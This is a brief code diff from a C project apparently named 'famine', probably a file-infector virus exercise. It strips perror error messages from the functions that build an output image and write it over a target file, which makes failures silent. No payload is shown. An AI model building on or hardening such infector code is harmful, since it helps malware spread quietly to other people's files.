@@ -62,7 +62,6 @@ static bool assemble_output(t_famine *p)
     p->target_file    = ft_calloc(1, p->target_size);
     if(!p->target_file)
     {
-        perror("Output allocation failed.");
         return false;
     }
     // Original image, unchanged
@@ -78,12 +77,10 @@ static bool write_output(t_famine *p, const char *path)
     int fd = open(path, O_WRONLY | O_TRUNC, 0755);
     if(fd == -1)
     {
-        perror("Open file failed.");
         return false;
     }
     if(write(fd, p->target_file, p->target_size) != (ssize_t)p->target_size)
     {
-        perror("Write file failed.");
         close(fd);
         return false;
     }
